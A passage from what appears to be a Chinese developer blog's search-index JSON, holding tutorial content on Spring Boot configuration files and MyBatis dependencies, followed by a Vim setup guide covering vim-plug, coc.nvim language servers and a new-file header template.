class=\"line\"><span class=\"comment\"># 内嵌tomcat端口号</span></span><br><span class=\"line\"><span class=\"string\">server.port=8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># servelet上下文路径</span></span><br><span class=\"line\"><span class=\"string\">server.servlet.context-path=/</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"YAML和YML\"><a href=\"#YAML和YML\" class=\"headerlink\" title=\"YAML和YML\"></a>YAML和YML</h3><p><code>application.properties</code>可以用<code>application.yaml</code>或者<code>application.yml</code>配置文件替代。<code>*.yml</code>或者<code>*.yaml</code>文件是另一种形式的配置文件，可以有层级的表示出相关配置，上文配置文件用<code>application.yml</code>来写等价于这种形式：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8080</span></span><br><span class=\"line\">  <span class=\"attr\">servlet:</span></span><br><span class=\"line\">    <span class=\"attr\">context-path:</span> <span class=\"string\">/</span></span><br></pre></td></tr></table></figure><br>需要这种层级的配置文件需要注：</p>\n<ul>\n<li>意冒号是半角字符，冒号后有一个空格</li>\n<li>配置条目末尾要注意没有空格，否则空格也会被识别为字符</li>\n<li>配置中的字符串不需要写引号</li>\n<li>当<code>application.properties</code>和<code>application.yml</code>同时存在，会优先使用<code>application.properties</code></li>\n</ul>\n<h3 id=\"自定义配置项\"><a href=\"#自定义配置项\" class=\"headerlink\" title=\"自定义配置项\"></a>自定义配置项</h3><p>对于用户自定义的配置，如项目是一个通用的学校的管理系统，只要在在学校的名称和人数上做特别配置。用户配置也可以写在SpringBoot配置文件中：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 用户自定义配置</span></span><br><span class=\"line\"><span class=\"attr\">school:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">NEU</span></span><br><span class=\"line\">    <span class=\"attr\">studentNumber:</span> <span class=\"number\">1000</span></span><br></pre></td></tr></table></figure><br>有两种方式读取配置文件：</p>\n<ol>\n<li>配置类</li>\n</ol>\n<p>新建一个配置类<code>SchoolConfig</code>，声明<code>@Component</code>注解，将它托管给Spring容器。<code>@ConfigurationProperties(prefix = &quot;school&quot;)</code>指定它是一个配置类，且从<code>&quot;school&quot;</code>的条目中读取同名的成员变量。<strong>补全getter和setter</strong>。<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// SchoolConfig.java</span></span><br><span class=\"line\"><span class=\"meta\">@Component</span> <span class=\"comment\">//托管给Spring</span></span><br><span class=\"line\"><span class=\"meta\">@ConfigurationProperties(prefix = &quot;school&quot;)</span> <span class=\"comment\">//配置类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SchoolConfig</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> studentNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// getter &amp; setter</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getStudentNumber</span><span class=\"params\">()</span> </span>&#123; <span class=\"keyword\">return</span> studentNumber;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getName</span><span class=\"params\">()</span> </span>&#123; <span class=\"keyword\">return</span> name; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setName</span><span class=\"params\">(String name)</span> </span>&#123; <span class=\"keyword\">this</span>.name = name;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setStudentNumber</span><span class=\"params\">(<span class=\"keyword\">int</span> studentNumber)</span> </span>&#123; <span class=\"keyword\">this</span>.studentNumber = studentNumber;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br>在项目启动后，可以用<code>@Autowired</code>自动实例化该类，拿到它的成员变量。例：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// IndexController.java</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/school&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, Object&gt; <span class=\"title\">schoolInfo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Map&lt;String,Object&gt; response = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">    response.put(<span class=\"string\">&quot;schoolName&quot;</span>, schoolConfig.getName());</span><br><span class=\"line\">    response.put(<span class=\"string\">&quot;studentNum&quot;</span>, schoolConfig.getStudentNumber());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这种方法可以直接将一类配置作为一个Bean读取，适合多个配置一组的场景。</p>\n<ol>\n<li><code>@Value</code>注解<br>第二种自定义配置读取的方法是用<code>@Value</code>注解直接将配置注入到变量中。<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// IndexController.java</span></span><br><span class=\"line\"><span class=\"meta\">@Value(&quot;$&#123;school.name&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> String schoolName;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Value(&quot;$&#123;school.studentNumber&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">int</span> studentNum;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/school&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, Object&gt; <span class=\"title\">schoolInfo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Map&lt;String,Object&gt; response = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">    response.put(<span class=\"string\">&quot;schoolName&quot;</span>, schoolName);</span><br><span class=\"line\">    response.put(<span class=\"string\">&quot;studentNum&quot;</span>, studentNum);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n这种方法不再要求变量和配置同名，适用于读取零散的单个配置。</li>\n</ol>\n<h3 id=\"多环境配置\"><a href=\"#多环境配置\" class=\"headerlink\" title=\"多环境配置\"></a>多环境配置</h3><p>在开发过程中往往用到三种环境：开发环境，测试环境，生产环境。各个环境用到的配置文件也不一样，SpringBoot支持预设多种环境下的配置文件，按照<code>application-XXX.properties</code>来命名。一般项目需要配置三个环境下的配置：<code>application-dev.properties</code>，<code>application-test.properties</code>，<code>application-release.properties</code>。</p>\n<p>而<code>application.properties</code>还是需要存在的，用它指明当前使用的配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">spring.profiles.active=dev</span> <span class=\"comment\"># 当前使用dev配置，将会读取application-dev.properties中的配置</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"MyBatis\"><a href=\"#MyBatis\" class=\"headerlink\" title=\"MyBatis\"></a>MyBatis</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--MySQL驱动--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>mysql<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mysql-connector-java<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.9<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--Springboot整合MyBatis依赖--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis.spring.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n","tags":["Java","Spring","后端","SpringBoot"]},{"title":"VIM配置","url":"/2022/06/26/VIM%E9%85%8D%E7%BD%AE/","content":"<blockquote>\n<p>公司的换皮vscode是真鸡儿难用啊，还不如自己配vim！</p>\n</blockquote>\n<h2 id=\"基本配置\"><a href=\"#基本配置\" class=\"headerlink\" title=\"基本配置\"></a>基本配置</h2><p><code>~/vim.rc</code>下配置缩进和高亮：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> nocompatible <span class=\"string\">&quot;do not compatible with vi</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">set number! &quot;</span>show line number </span><br><span class=\"line\"><span class=\"built_in\">set</span> expandtab</span><br><span class=\"line\"><span class=\"built_in\">set</span> autoindent  <span class=\"string\">&quot;set auto indent</span></span><br><span class=\"line\"><span class=\"string\">set cindent  &quot;</span><span class=\"built_in\">set</span> clang auto indent</span><br><span class=\"line\"><span class=\"built_in\">set</span> shiftwidth=4 </span><br><span class=\"line\"><span class=\"built_in\">set</span> softtabstop=4</span><br><span class=\"line\"><span class=\"built_in\">set</span> tabstop=4 </span><br><span class=\"line\"></span><br><span class=\"line\">syntax on <span class=\"string\">&quot;set syntax highlight</span></span><br><span class=\"line\"><span class=\"string\">autocmd BufNewFile,BufRead *.c set syntax=c</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">set cursorline &quot;</span>highlight current line</span><br><span class=\"line\"><span class=\"built_in\">set</span> showmatch <span class=\"string\">&quot;highlight bracket matching</span></span><br><span class=\"line\"><span class=\"string\">set showmode &quot;</span>show current op mode at bottom</span><br><span class=\"line\"><span class=\"built_in\">set</span> <span class=\"built_in\">bg</span>=dark <span class=\"string\">&quot;set background color</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">set hlsearch &quot;</span>highlight search result</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"vim-plug\"><a href=\"#vim-plug\" class=\"headerlink\" title=\"vim-plug\"></a>vim-plug</h2><p><a href=\"https://github.com/junegunn/vim-plug\">vim-plugin</a>是一款vim的插件管理器。</p>\n<p><strong>安装</strong>：将<code>plug.vim</code>下载到<code>~/.vim/autoload</code>下<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -fLo ~/.vim/<span class=\"built_in\">autoload</span>/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure><br>编辑<code>~/.vimrc</code>，在<code>plug#begin([PLUGIN_DIR])</code>和<code>call plug#end()</code>之间添加插件：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">call plug<span class=\"comment\">#begin()</span></span><br><span class=\"line\"><span class=\"string\">&quot; The default plugin directory will be as follows:</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>   - Vim (Linux/macOS): <span class=\"string\">&#x27;~/.vim/plugged&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;   - Vim (Windows): &#x27;~/vimfiles/plugged&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>   - Neovim (Linux/macOS/Windows): stdpath(<span class=\"string\">&#x27;data&#x27;</span>) . <span class=\"string\">&#x27;/plugged&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot; You can specify a custom plugin directory by passing it as the argument</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span>   - e.g. `call plug<span class=\"comment\">#begin(&#x27;~/.vim/plugged&#x27;)`</span></span><br><span class=\"line\"><span class=\"string\">&quot;   - Avoid using standard Vim directory names like &#x27;plugin&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> Make sure you use single quotes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; Shorthand notation; fetches https://github.com/junegunn/vim-easy-align</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;junegunn/vim-easy-align&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> Any valid git URL is allowed</span><br><span class=\"line\">Plug <span class=\"string\">&#x27;https://github.com/junegunn/vim-github-dashboard.git&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; Multiple Plug commands can be written in a single line using | separators</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;SirVer/ultisnips&#x27; | Plug &#x27;honza/vim-snippets&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> On-demand loading</span><br><span class=\"line\">Plug <span class=\"string\">&#x27;scrooloose/nerdtree&#x27;</span>, &#123; <span class=\"string\">&#x27;on&#x27;</span>:  <span class=\"string\">&#x27;NERDTreeToggle&#x27;</span> &#125;</span><br><span class=\"line\">Plug <span class=\"string\">&#x27;tpope/vim-fireplace&#x27;</span>, &#123; <span class=\"string\">&#x27;for&#x27;</span>: <span class=\"string\">&#x27;clojure&#x27;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; Using a non-default branch</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;rdnetto/YCM-Generator&#x27;, &#123; &#x27;branch&#x27;: &#x27;stable&#x27; &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> Using a tagged release; wildcard allowed (requires git 1.9.2 or above)</span><br><span class=\"line\">Plug <span class=\"string\">&#x27;fatih/vim-go&#x27;</span>, &#123; <span class=\"string\">&#x27;tag&#x27;</span>: <span class=\"string\">&#x27;*&#x27;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; Plugin options</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;nsf/gocode&#x27;, &#123; &#x27;tag&#x27;: &#x27;v.20150303&#x27;, &#x27;rtp&#x27;: &#x27;vim&#x27; &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> Plugin outside ~/.vim/plugged with post-update hook</span><br><span class=\"line\">Plug <span class=\"string\">&#x27;junegunn/fzf&#x27;</span>, &#123; <span class=\"string\">&#x27;dir&#x27;</span>: <span class=\"string\">&#x27;~/.fzf&#x27;</span>, <span class=\"string\">&#x27;do&#x27;</span>: <span class=\"string\">&#x27;./install --all&#x27;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; Unmanaged plugin (manually installed and updated)</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;~/my-prototype-plugin&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> Initialize plugin system</span><br><span class=\"line\">call plug<span class=\"comment\">#end()</span></span><br></pre></td></tr></table></figure><br>vim中执行<code>:PlugInstall</code>安装插件，<code>:PlugUpdate</code>更新插件</p>\n<h2 id=\"coc-vim\"><a href=\"#coc-vim\" class=\"headerlink\" title=\"coc.vim\"></a>coc.vim</h2><p><a href=\"https://github.com/neoclide/coc.nvim\">coc.vim</a>是另一款node作为后端的vim插件。</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>使用<code>vim-plug</code>安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot; coc.vim</span></span><br><span class=\"line\"><span class=\"string\">Plug &#x27;neoclide/coc.nvim&#x27;, &#123; &#x27;branch&#x27;: &#x27;master&#x27;, &#x27;do&#x27;: &#x27;yarn install --frozen-lockfile&#x27; &#125;</span></span><br></pre></td></tr></table></figure><br>vim执行<code>:PluginInstall</code>。</p>\n<h3 id=\"extensions\"><a href=\"#extensions\" class=\"headerlink\" title=\"extensions\"></a>extensions</h3><p>用<code>vim.coc</code>安装各类语言对应的服务器插件，可以在<a href=\"https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions\">Using-coc-extensions</a>找到<code>vim.coc</code>支持的插件列表。</p>\n<p>进入vim后在命令模式下用<code>CocInstall [extension-name]</code>来安装插件，例如：<code>CocInstall coc-sh</code>安装shell脚本插件，安装完毕后前往<code>~/.vim/coc-settings.json</code>或者在vim中执行<code>CocConfig</code>配置插件，插件的信息配置在<code>languageserver</code>下：<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;languageserver&quot;</span>: &#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;bash&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;bash-language-server&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;args&quot;</span>: [<span class=\"string\">&quot;start&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;filetypes&quot;</span>: [<span class=\"string\">&quot;sh&quot;</span>]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>语言插件往往依赖开源语言服务协议(Language Server Protocal)，</p>\n<blockquote>\n<p>LSP（Language-Server-Protocol）开源的语言服务器协定。由红帽、微软和 Codenvy 联合推出，可以让不同的程序编辑器与集成开发环境（IDE）方便嵌入各种程序语言，允许开发人员在最喜爱的工具中使用各种语言来撰写程序。</p>\n<p>唯一基于JSON的语言服务器数据交换协定，目前由GitHub代管，并采用CC及MIT授权。该协定主要用来促进编辑器及语言服务器之间的互动，允许开 发人员在各种编辑器或整合开发环境中存取智慧型的程序语言工具，像是以符号搜寻、语法分析、自动完成代码、移至定义、描绘轮廓或重构等。</p>\n</blockquote>\n<p>例如shell的开源语言服务器：<a href=\"https://github.com/bash-lsp/bash-language-server\">bash-language-server</a><code>：\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g bash-language-server</span><br></pre></td></tr></table></figure>\n安装完成后命令行中运行</code>which bash-language-server`检查安装。</p>\n<h4 id=\"C-C-amp-CMake\"><a href=\"#C-C-amp-CMake\" class=\"headerlink\" title=\"C/C++ &amp; CMake\"></a>C/C++ &amp; CMake</h4><p><code>CocInstall coc-clangd</code><br><code>CocInstall coc-cmake</code></p>\n<p>需要依赖<code>clangd</code>和<a href=\"https://github.com/regen100/cmake-language-server\">cmake-language-server</a><br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;languageserver&quot;</span>: &#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;clangd&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;clangd&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;rootPatterns&quot;</span>: [<span class=\"string\">&quot;compile_flags.txt&quot;</span>, <span class=\"string\">&quot;compile_commands.json&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;filetypes&quot;</span>: [<span class=\"string\">&quot;c&quot;</span>, <span class=\"string\">&quot;cc&quot;</span>, <span class=\"string\">&quot;cpp&quot;</span>, <span class=\"string\">&quot;c++&quot;</span>, <span class=\"string\">&quot;objc&quot;</span>, <span class=\"string\">&quot;objcpp&quot;</span>]</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  <span class=\"attr\">&quot;cmake&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;cmake-language-server&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;filetypes&quot;</span>: [<span class=\"string\">&quot;cmake&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;rootPatterns&quot;</span>: [<span class=\"string\">&quot;build/&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;initializationOptions&quot;</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">&quot;buildDirectory&quot;</span>: <span class=\"string\">&quot;build&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h4><p><code>CocInstall coc-rust-analyzer</code><br>需要依赖<a href=\"https://github.com/rust-lang/rust-analyzer\">rust-analyzer</a><br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;languageserver&quot;</span>: &#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;rust&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;command&quot;</span>: <span class=\"string\">&quot;rust-analyzer&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;filetypes&quot;</span>: [<span class=\"string\">&quot;rust&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">&quot;rootPatterns&quot;</span>: [<span class=\"string\">&quot;Cargo.toml&quot;</span>]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h4><p><code>CocInstall coc-json</code><br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;json.enable&quot;</span>: <span class=\"literal\">true</span>, </span><br><span class=\"line\"><span class=\"string\">&quot;json.format.enable&quot;</span>: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h4><p><code>CocInstall coc-webview</code><br><code>CocInstall coc-markdown-preview-enhanced</code><br>开启webview preview:<br><code>CocCommand markdown-preview-enhanced.openPreview</code></p>\n<h4 id=\"Markup\"><a href=\"#Markup\" class=\"headerlink\" title=\"Markup\"></a>Markup</h4><p><code>CocInstall coc-markmap</code><br>生成思维导图：<br><code>CocCommand markmap.create</code></p>\n<h4 id=\"explorer\"><a href=\"#explorer\" class=\"headerlink\" title=\"explorer\"></a>explorer</h4><p><code>CocInstall coc-explorer</code><br>文件浏览器</p>\n<h2 id=\"新文件模板\"><a href=\"#新文件模板\" class=\"headerlink\" title=\"新文件模板\"></a>新文件模板</h2><p>在<code>~/.vimrc</code>中写入：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">autocmd BufNewFile *.html 0r ~/.vim/template/template.html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; call setTitle() automatically when create .h .c .hpp .cpp .sh .py</span></span><br><span class=\"line\"><span class=\"string\">autocmd BufNewFile *.[ch],*.hpp,*.cpp,*.sh,*.py exec &quot;</span>:call SetTitle()<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span> add comment</span><br><span class=\"line\">func SetComment()</span><br><span class=\"line\">    call setline(1,<span class=\"string\">&quot;/*================================================================&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>),   <span class=\"string\">&quot;*   Copyright (C) &quot;</span>.strftime(<span class=\"string\">&quot;%Y&quot;</span>).<span class=\"string\">&quot; XUranus All rights reserved.&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+1, <span class=\"string\">&quot;*   &quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+2, <span class=\"string\">&quot;*   File:         &quot;</span>.expand(<span class=\"string\">&quot;%:t&quot;</span>))</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+3, <span class=\"string\">&quot;*   Author:       XUranus&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+4, <span class=\"string\">&quot;*   Date:         &quot;</span>.strftime(<span class=\"string\">&quot;%Y-%m-%d-&quot;</span>))</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+5, <span class=\"string\">&quot;*   Description:  &quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+6, <span class=\"string\">&quot;*&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+7, <span class=\"string\">&quot;================================================================*/&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+8, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    call append(line(<span class=\"string\">&quot;.&quot;</span>)+9, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">endfunc</span><br><span class=\"line\"><span class=\"string\">&quot; comment for *.sh, *.py</span></span><br><span class=\"line\"><span class=\"string\">func SetComment_script()</span></span><br><span class=\"line\"><span class=\"string\">    call setline(3,&quot;</span><span class=\"comment\">#*================================================================&quot;)</span></span><br><span class=\"line\">    call setline(4, <span class=\"string\">&quot;#*   Copyright (C) &quot;</span>.strftime(<span class=\"string\">&quot;%Y&quot;</span>).<span class=\"string\">&quot; XUranus All rights reserved.&quot;</span>)</span><br><span class=\"line\">    call setline(5, <span class=\"string\">&quot;#*   &quot;</span>)</span><br><span class=\"line\">    call setline(6, <span class=\"string\">&quot;#*   File:         &quot;</span>.expand(<span class=\"string\">&quot;%:t&quot;</span>))</span><br><span class=\"line\">    call setline(7, <span class=\"string\">&quot;#*   Author:       XUranus&quot;</span>)</span><br><span class=\"line\">    call setline(8, <span class=\"string\">&quot;#*   Date:         &quot;</span>.strftime(<span class=\"string\">&quot;%Y-%m-%d-&quot;</span>))</span><br><span class=\"line\">    call setline(9, <span class=\"string\">&quot;#*   Description:  &quot;</span>)</span><br><span class=\"line\">    call setline(10, <span class=\"string\">&quot;#*&quot;</span>)</span><br><span class=\"line\">    call setline(11, <span class=\"string\">&quot;#================================================================*/&quot;</span>)</span><br><span class=\"line\">    call setline(12, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    call setline(13, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">endfunc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot; auto insert to head of file</span></span><br><span class=\"line\"><span class=\"string\">func SetTitle()</span></span><br><span class=\"line\"><span class=\"string\">    if &amp;filetype == &#x27;sh&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        call setline(1,&quot;</span><span class=\"comment\">#!/usr/bin/bash&quot;)</span></span><br><span class=\"line\">        call setline(2,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        call SetComment_script()</span><br><span class=\"line\">    elseif &amp;filetype == <span class=\"string\">&#x27;python&#x27;</span></span><br><span class=\"line\">        call setline(1,<span class=\"string\">&quot;#!/usr/bin/python&quot;</span>)</span><br><span class=\"line\">        call setline(2,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        call SetComment_script()</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        call SetComment()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> expand(<span class=\"string\">&quot;%:e&quot;</span>) == <span class=\"string\">&#x27;hpp&#x27;</span></span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+10, <span class=\"string\">&quot;#ifndef _&quot;</span>.toupper(expand(<span class=\"string\">&quot;%:t:r&quot;</span>)).<span class=\"string\">&quot;_H&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+11, <span class=\"string\">&quot;#define _&quot;</span>.toupper(expand(<span class=\"string\">&quot;%:t:r&quot;</span>)).<span class=\"string\">&quot;_H&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+12, <span class=\"string\">&quot;#ifdef 